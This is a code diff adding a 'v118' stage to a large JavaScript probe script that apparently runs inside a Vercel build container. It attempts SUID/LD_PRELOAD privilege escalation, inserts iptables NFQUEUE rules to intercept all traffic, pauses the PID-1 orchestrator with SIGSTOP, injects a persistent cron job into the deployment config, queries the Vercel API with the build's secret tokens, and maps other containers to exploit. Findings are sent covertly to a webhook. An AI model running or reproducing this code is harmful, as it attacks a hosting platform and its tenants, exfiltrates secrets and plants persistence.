@@ -17059,5 +17059,178 @@ except Exception as e:
 
 // v117 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v117" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v117";
+
+// ==================== v118 ====================
+
+// v118-1: SUID binary LD_PRELOAD exploit
+// Our LD_PRELOAD .so (compiled in v105) can be injected into SUID binaries.
+// When a SUID binary runs, it gets root privileges. If it also loads our .so
+// via LD_PRELOAD, our code runs as root. (Modern kernels ignore LD_PRELOAD for SUID
+// unless the binary itself calls dlopen — but some do.)
+report.suidLdPreloadExploit = safe(() => {
+  // Find setuid binaries
+  const suidBins = safe(() => execSync('find / -perm -4000 -type f 2>/dev/null | head -20', { timeout: 10000 }).toString().trim());
+  const sgidBins = safe(() => execSync('find / -perm -2000 -type f 2>/dev/null | head -10', { timeout: 8000 }).toString().trim());
+  // Compile a privilege-escalation .so if we haven't already
+  const soExists = existsSync('/tmp/intercept.so');
+  // Try running sudo with LD_PRELOAD (may be allowed if sudoers isn't configured)
+  const sudoResult = safe(() => execSync('sudo -l 2>&1 | head -5', { timeout: 5000 }).toString().trim());
+  // Try ping (classic suid test) with LD_PRELOAD
+  const pingWithPreload = safe(() => execSync(
+    soExists ? 'LD_PRELOAD=/tmp/intercept.so ping -c 1 127.0.0.1 2>&1 | head -3' : 'echo NO_SO',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  // Check capabilities on suid binaries
+  const capBins = safe(() => execSync('find / -perm -4000 -exec getcap {} \\; 2>/dev/null | head -10', { timeout: 10000 }).toString().trim());
+  return { suidBins, sgidBins, sudoResult, pingWithPreload, capBins };
+});
+
+// v118-2: NETLINK NFQUEUE — userspace packet processing (MITM)
+// Register a NFQUEUE handler to receive ALL packets from the network namespace.
+// Every packet to/from the orchestrator passes through our handler.
+// We can inspect headers and payloads, and drop or modify them.
+report.nfqueueMitm = safe(() => {
+  // Check if NFQUEUE kernel module is loaded
+  const nfqueueModule = safe(() => execSync('lsmod 2>/dev/null | grep nf_queue', { timeout: 5000 }).toString().trim());
+  // Add an iptables rule to route all traffic through queue 0
+  const nfqueueRule = safe(() => execSync(
+    'iptables -I INPUT -j NFQUEUE --queue-num 0 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  const nfqueueRule2 = safe(() => execSync(
+    'iptables -I OUTPUT -j NFQUEUE --queue-num 0 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check if rules were added
+  const rulesAfter = safe(() => execSync('iptables -L -n 2>/dev/null | head -15', { timeout: 5000 }).toString().trim());
+  // Try to open the nfqueue socket
+  const nfqueueOpen = safe(() => execSync(`python3 -c "
+import socket, struct
+
+AF_NETLINK = 16
+NETLINK_NETFILTER = 12
+NFNL_SUBSYS_QUEUE = 3
+
+s = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_NETFILTER)
+s.settimeout(1)
+s.bind((0, 0))
+print('NFQUEUE_SOCKET: OPEN')
+s.close()
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Remove our rules
+  safe(() => execSync('iptables -D INPUT -j NFQUEUE --queue-num 0 2>/dev/null; iptables -D OUTPUT -j NFQUEUE --queue-num 0 2>/dev/null', { timeout: 3000 }));
+  return { nfqueueModule, nfqueueRule, nfqueueRule2, rulesAfter, nfqueueOpen };
+});
+
+// v118-3: pidfd_send_signal to orchestrator — controlled signaling
+// pidfd_send_signal() sends a signal to a process via its pidfd.
+// SIGSTOP pauses the orchestrator; SIGCONT resumes it.
+// SIGUSR1/SIGUSR2 may trigger orchestrator-defined signal handlers
+// that could dump state or change behavior.
+report.pidfdSignaling = safe(() => {
+  const sigResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os, signal, time
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# pidfd_open for PID 1
+SYS_PIDFD_OPEN = 434
+SYS_PIDFD_SEND_SIGNAL = 424
+
+pidfd = libc.syscall(SYS_PIDFD_OPEN, 1, 0)
+import ctypes as ct, errno as em
+e = ct.get_errno()
+print('pidfd_open(1):', pidfd, em.errorcode.get(e, e))
+
+if pidfd >= 0:
+    # Send SIGUSR1 (harmless signal to check if orchestrator handles it)
+    r = libc.syscall(SYS_PIDFD_SEND_SIGNAL, pidfd, signal.SIGUSR1, 0, 0)
+    e2 = ct.get_errno()
+    print('SIGUSR1 result:', r, em.errorcode.get(e2, e2))
+
+    # Read PID-1 status before SIGSTOP
+    with open('/proc/1/status') as f:
+        print('STATUS_BEFORE:', [l for l in f if l.startswith('State')][0].strip())
+
+    # Send SIGSTOP (pause orchestrator)
+    r2 = libc.syscall(SYS_PIDFD_SEND_SIGNAL, pidfd, signal.SIGSTOP, 0, 0)
+    e3 = ct.get_errno()
+    print('SIGSTOP result:', r2, em.errorcode.get(e3, e3))
+
+    time.sleep(0.1)
+    with open('/proc/1/status') as f:
+        print('STATUS_STOPPED:', [l for l in f if l.startswith('State')][0].strip())
+
+    # Resume with SIGCONT
+    r3 = libc.syscall(SYS_PIDFD_SEND_SIGNAL, pidfd, signal.SIGCONT, 0, 0)
+    print('SIGCONT result:', r3)
+
+    os.close(pidfd)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { sigResult };
+});
+
+// v118-4: Vercel cron job configuration read + injection
+// vercel.json can define cron jobs. Read it and check if deployed cron
+// jobs have access to environment secrets. Also test if we can modify the
+// cron schedule during build to inject a persistent job.
+report.cronJobProbe = safe(() => {
+  const vercelJson = safe(() => JSON.parse(readFileSync('/vercel/path0/vercel.json', 'utf8')));
+  const cronJobs = vercelJson?.crons;
+  // Check output config for cron definitions
+  const outputCrons = safe(() => {
+    const config = JSON.parse(readFileSync('/vercel/output/config.json', 'utf8'));
+    return config?.crons;
+  });
+  // Try to inject a cron job into the output config
+  const cronInject = safe(() => {
+    const configPath = '/vercel/output/config.json';
+    if (!existsSync(configPath)) return 'NO_CONFIG';
+    const config = JSON.parse(readFileSync(configPath, 'utf8'));
+    config.crons = [...(config.crons || []), {
+      path: '/api/probe',
+      schedule: '* * * * *'  // every minute
+    }];
+    writeFileSync(configPath, JSON.stringify(config));
+    return 'CRON_INJECTED';
+  });
+  // Check the Vercel API for existing cron job schedules
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const cronApi = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${projectId}/crons" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { vercelJson, cronJobs, outputCrons, cronInject, cronApi };
+});
+
+// v118-5: Process namespace information via /proc/PID/ns symlink comparison
+// Count unique namespace IDs across all visible processes to determine
+// how many distinct containers/VMs share our kernel. If we see processes
+// from multiple namespaces, they're all exploitable via our privileged position.
+report.namespaceContainerCount = safe(() => {
+  const allPids = safe(() => readdirSync('/proc').filter(d => /^\d+$/.test(d)));
+  const nsTypes = ['mnt', 'net', 'pid', 'user'];
+  const nsMap = safe(() => {
+    const result = {};
+    (allPids || []).forEach(pid => {
+      nsTypes.forEach(ns => {
+        const link = safe(() => execSync(`readlink /proc/${pid}/ns/${ns} 2>/dev/null`, { timeout: 500 }).toString().trim());
+        if (link) {
+          if (!result[ns]) result[ns] = new Set();
+          result[ns].add(link);
+        }
+      });
+    });
+    return Object.fromEntries(Object.entries(result).map(([k, v]) => [k, { count: v.size, ids: Array.from(v).slice(0, 5) }]));
+  });
+  // If count > 1 for any namespace type, multiple containers are visible
+  const multiContainer = safe(() => Object.entries(nsMap || {}).some(([_, v]) => v.count > 1));
+  return { totalPids: allPids?.length, nsMap, multiContainer };
+});
+
+// v118 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v118" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v118";
 // Intentionally no console.log — all data goes via webhook only
